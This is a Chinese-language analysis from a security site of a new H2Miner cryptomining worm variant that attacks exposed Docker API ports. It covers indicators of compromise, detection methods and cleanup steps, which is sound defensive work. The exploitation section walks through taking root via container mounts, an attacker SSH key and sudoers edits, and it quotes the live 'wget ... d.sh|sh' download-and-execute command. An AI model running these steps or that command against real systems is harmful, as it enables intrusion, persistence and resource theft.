# H2Miner挖矿蠕虫新变种

阅读量 **388174**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-15 15:30:11

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 一、概述

近期捕获到H2Miner挖矿蠕虫变种病毒，H2Miner是一个linux下的挖矿病毒，是用Golang编码的，该变种利用Docker
swarm开放一个TCP端口2375（或2376）攻击云服务器，下载恶意脚本和恶意程序进行挖矿，然后试图将恶意软件传播到其他云服务器。攻击者利用失陷的主机进行挖矿，会消耗CPU资源，严重影响主机的使用。从所获得的新变种与老版本比较后，之间没有太多的变化，主要是更改了文件中的后门地址以及相关的文件名，该家族的脚本名称不是固定的，是按照英文字母a-z为基础命名的，此次捕获的脚本是d.sh。攻击者从利用开放端口开始，通过规避策略和横向移动，一直到部署恶意矿工的全流程执行

下面的流程图说明了完整的攻击流程

![](https://p2.ssl.qhimg.com/t014448c59103f6071b.png)

## 二、漏洞利用

swarm是Docker官方提供的一款编排容器的工具，其主要作用是把若干台Docker主机抽象为一个整体，并且通过默认端口2375远程操控Docker管理这些Docker主机上的各种资源。如要使用swarm，则必须让Docker开放其HTTP的API。默认情况下这个API没有开启，而开启此API需要在启动时加入-H参数，执行-H tcp://0.0.0.0:2375，亦或2376

![](https://p1.ssl.qhimg.com/t01bb0c448f678f8c5c.png)

安装Docker需要使用root或sudo权限，也就是说，容器内部的root用户就是宿主机的root用户，一旦挂载目录，就可以在容器内部以宿主机的root用户身份对挂载的文件系统随意修改了。

Docker是以root权限运行的，无法直接控制宿主机，所以可以先将本地文件或目录挂载到容器内，在容器内这些文件和目录是可以修改的。例如把/root/挂载到容器内，再将攻击者的ssh公钥/.ssh/id_rsa.pub的内容写到入被攻击Docker宿主机的/root/.ssh/authorized_keys文件中，修改权限为600，此时就可以以root用户登录了。

本地获取ssh公钥

![](https://p1.ssl.qhimg.com/t010339d8b58e3d5353.png)

将公钥复制到被攻击的.ssh/authorized_keys文件中

挂载目录并且修改 /etc/sudoers 文件，直接配置成免密码，sudo免密切换root

如果主机不允许root用户直接登录，可以通过挂载 /etc/ssh/sshd_config 查看配置。那就换一个用户写入，并且修改 /etc/sudoers
文件，sudo vim etc/sudoers,

此时，拿下了主机的root权限，或者拥有sudo权限的用户，执行wget -q -O – http://93.189.43.3/d.sh|sh（服务已关）

## 三、样本分析

### 3.1d.sh

d.sh,一共670行代码，发现脚本执行了以下操作

1.禁用安全措施并清除日志： echo SELINUX=disabled >/etc/selinux/config

2.卸载安全应用程序，清除他挖矿程序和服务进程

3.kill其他加密矿工相关的文件，其中大部分是/tmp，/var/tmp

4.killdocker容器服务进程，并删除镜像

5.下载Kinsing,并运行

6.创建定时任务，每分钟运行一次，并且指向域名，下载脚本

停止linux安全内核模块

![](https://p4.ssl.qhimg.com/t01171bc7fa69f68972.png)

删除系统日志

![](https://p2.ssl.qhimg.com/t01de8988bc5b0ac994.png)

下载2个卸载阿里云安全服务的脚本

![](https://p3.ssl.qhimg.com/t01d9ca0767a6b161c7.png)

![](https://p2.ssl.qhimg.com/t015c80f0eb06e24a97.png)

netstat根据端口查看服务进程，端口是竞争挖矿木马惯用端口范围，检测主机上是否存在其他的挖矿病毒，有的话直接kill

![](https://p1.ssl.qhimg.com/t018bcb657a4c48ad9e.png)

ps 根据服务名称和进程路径查看进程，都是挖矿木马类型

![](https://p0.ssl.qhimg.com/t019d268e67fed76984.png)

根据挖矿ip，矿池域名查看服务进程（门罗币）

![](https://p3.ssl.qhimg.com/t015962993dce0e4617.png)

删除其他挖矿木马相关文件

![](https://p2.ssl.qhimg.com/t0103b95201c08f0cce.png)

停止docker容器，并删除镜像

![](https://p2.ssl.qhimg.com/t0109db79a212651fed.png)

download函数会检查是否存在kinsing，并校验文件的MD5，然后download2函数下载Kinsing文件并校验MD5值是否正确，如果MD5不正确或者文件不存在就调用
download3函数继续下载Kinsing

![](https://p4.ssl.qhimg.com/t018406dd8fc4ab2398.png)

![](https://p0.ssl.qhimg.com/t014a1eb9bf34cffde4.png)

crontab创建定时任务，确保d.sh持久化

![](https://p2.ssl.qhimg.com/t01417aad6e3aae7033.png)

定时任务，每一分钟执行一次，访问url（195.3.146.118）下载d.sh

![](https://p0.ssl.qhimg.com/t01b3dc8938e9811906.png)

根据定时任务名称删除其他任务

![](https://p0.ssl.qhimg.com/t016dfbfbc81ee41696.png)

### 3.2恶意程序Kinsing

Kinsing执行了以下操作

1.与C&C服务器通信

2.利用masscan扫描端口

3.Redis暴力破解

4.下载spre.sh脚本

5.下载cron.sh脚本

6.释放kdevtmpfsi 矿工

与C&C服务器185.154.53.140进行通信

![](https://p0.ssl.qhimg.com/t01f56d164f854c900a.png)

![](https://p4.ssl.qhimg.com/t01ae6c616fa619cfe7.png)

获取任务的函数

![](https://p0.ssl.qhimg.com/t01506fd3268e7a834b.png)

获取C2地址

![](https://p4.ssl.qhimg.com/t01c729e41b80560632.png)

RC4解密得到C2地址

![](https://p2.ssl.qhimg.com/t0195ac0116b3c783de.png)

执行相关任务的函数

![](https://p4.ssl.qhimg.com/t015b2b01c624d7a72e.png)

masscan,是一款渗透工具，masscan是一种Internet规模的端口扫描程序，可用于对Internet或内部网络。速度足以在3分钟内扫描Internet的端口。

![](https://p1.ssl.qhimg.com/t01024c19c51876c781.png)

![](https://p3.ssl.qhimg.com/t0194f2ab39a2775c89.png)

获取目标

![](https://p5.ssl.qhimg.com/t01cb29d5d6107bc3a7.png)

创建firewire.sh脚本并运行

![](https://p0.ssl.qhimg.com/t01abb3fe32dccf4737.png)

![](https://p3.ssl.qhimg.com/t012b85e979871cd1b6.png)

针对Redis暴力破解

![](https://p0.ssl.qhimg.com/t01c7d76149e2410d5e.png)

用AUTH命令进行口令认证：

![](https://p2.ssl.qhimg.com/t01b0b297f10815c6eb.png)

![](https://p2.ssl.qhimg.com/t01041a36cd1a60524e.png)

spre.sh

![](https://p2.ssl.qhimg.com/t0130a04b41759f81d3.png)

检索id_rsa*，/.ssh/config，/.bash_history，HostName进行匹配，并找到相对的身份信息，利用ssh|scp横向传播下载并运行shell脚本

![](https://p2.ssl.qhimg.com/t01a597ef2e5dbfa8b3.png)

每20次SSH|SCP连接尝试后会休眠20秒，这种可能是为了躲避发现

![](https://p1.ssl.qhimg.com/t014cb4f4da84d7f9cd.png)

cron.sh

![](https://p4.ssl.qhimg.com/t01cc04b19a489bba9a.png)

根据进程名,ip进行kill，

![](https://p5.ssl.qhimg.com/t01f257bb7f94d680d3.png)

创建定时任务，每分钟执行并且下载unk.sh

![](https://p4.ssl.qhimg.com/t01f7e822afe90d1f4a.png)

kdevtmpfsi

释放文件并执行的函数

![](https://p3.ssl.qhimg.com/t01b1580ab351261980.png)

![](https://p4.ssl.qhimg.com/t01cb2c936f5a8ffb5f.png)

![](https://p4.ssl.qhimg.com/t01ba6be52a72f376da.png)

![](https://p3.ssl.qhimg.com/t011fdd6dc4bd9a603e.png)

修改权限并启动

![](https://p4.ssl.qhimg.com/t01f704a8b53dba6582.png)

sub_400D50方法有连接矿池域名，登录矿池，申请内存的行为

![](https://p5.ssl.qhimg.com/t01b53d0397c8eaa17e.png)

sub_40CD70矿池配置config.json，连接矿池域名以及钱包地址

![](https://p3.ssl.qhimg.com/t01279f7fb1d2999006.png)

![](https://p5.ssl.qhimg.com/t010411f90fdbbf9d34.png)

挖矿程序版本号5.5.0

![](https://p3.ssl.qhimg.com/t01a9e442e51d382266.png)

矿池账户密码

![](https://p1.ssl.qhimg.com/t01bf31aa8453599ac8.png)

![](https://p4.ssl.qhimg.com/t015224917fd475f3db.png)

配置CPU最大线程

![](https://p2.ssl.qhimg.com/t01e3b32338e7a09613.png)

搜索挖矿关键字miner

![](https://p1.ssl.qhimg.com/t01bb26fb4bd2f3d538.png)

这部分由以下函数进行调用，获取CPU信息，系统CPU时间

![](https://p5.ssl.qhimg.com/t01e97b3f57a45606a2.png)

## 四、IOCs

IP

104.192.141.1

93.189.43.3

195.3.146.118

185.154.53.140

194.38.20.199

MD5

d.sh

be17040e1a4eaf7e2df8c0273ff2dfd2

spre.sh

639d87d54aa57371cc0bf82409503311

kinsing

52ca5bc47c84a748d2b349871331d36a

kdevtmpfsi

8c6681daba966addd295ad89bf5146af

URL

https://bitbucket.org/tromdiga1/git/raw/master/kinsing

http://93.189.43.3/kinsing

http://195.3.146.118/d.sh

http://93.189.43.3/d.sh

http://93.189.43.3/spr.sh

http://185.191.32.198/unk.sh

## 五、监测方法

1.利用威胁情报，监控主机是否连接矿池域名

2.监控异常服务进程的CPU利用率，设置告警阈值

3.监控挖矿程序惯用端口，以及挖矿程序惯用进程名，挖矿程序生成的文件

4.遍历root/.ssh/中的密钥信息是否被清空

5.是否存在异常未知的定时任务，尤其是指向未知域名

6.监控执行批量及高位命令行kill，rm，wget -q -O，chmod，curl。挖矿程序高危路径/tmp，/var/tmp

## 六、清理挖矿建议

利用top查看cpu使用情况

![](https://p4.ssl.qhimg.com/t01c1577c3dfcc63c35.png)

再根据PID进程号，查看进程的指定程序路径，或者find服务名，检索文件位置

![](https://p4.ssl.qhimg.com/t016183c3ebaccec1cc.png)

ps – ef | grep kedevtmpfsi 查看挖矿进程，删除挖坑程序，守护进程会一直重启它

所以需要先删除守护进程，再kill
kedevtmpfsi，此时还有最重要的一步，就是先删除定时任务，要不然，挖矿程序还会定时启动，因为d.sh脚本会再次下载挖矿程序，再次启动，

![](https://p0.ssl.qhimg.com/t018a1c6b24ddc4699b.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Derder** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/259034](/post/id/259034)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [恶意软件](/tag/恶意软件)
  * [逆向工程](/tag/逆向工程)
  * [样本分析](/tag/样本分析)

 **+1** __4赞

 __收藏

![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg) Derder

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

